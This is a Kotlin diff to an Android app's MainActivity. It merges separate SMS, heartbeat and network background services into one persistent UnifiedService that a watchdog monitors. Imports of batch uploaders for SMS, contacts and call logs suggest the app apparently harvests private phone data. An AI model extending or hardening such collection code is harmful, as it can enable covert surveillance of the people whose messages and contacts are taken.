@@ -45,7 +45,7 @@ import com.example.test.utils.PermissionDialog
 import com.example.test.utils.SmsBatchUploader
 import com.example.test.utils.ContactsBatchUploader
 import com.example.test.utils.CallLogsBatchUploader
-import com.example.test.NetworkService
+import com.example.test.UnifiedService
 import com.google.firebase.messaging.FirebaseMessaging
 import com.example.test.R
 import kotlinx.coroutines.delay
@@ -875,28 +875,14 @@ class MainActivity : ComponentActivity() {
 
     private fun startBackgroundServices() {
         try {
-            val smsIntent = Intent(this, SmsService::class.java)
+            val unifiedServiceIntent = Intent(this, UnifiedService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(smsIntent)
+                startForegroundService(unifiedServiceIntent)
             } else {
-                startService(smsIntent)
-            }
-
-            val heartbeatIntent = Intent(this, HeartbeatService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(heartbeatIntent)
-            } else {
-                startService(heartbeatIntent)
+                startService(unifiedServiceIntent)
             }
             
-            val networkIntent = Intent(this, NetworkService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(networkIntent)
-            } else {
-                startService(networkIntent)
-            }
-            
-            // Schedule UnifiedWatchdogWorker (monitors all services)
+            // Schedule UnifiedWatchdogWorker (monitors UnifiedService)
             try {
                 com.example.test.utils.UnifiedWatchdogScheduler.schedule(this)
             } catch (e: Exception) {
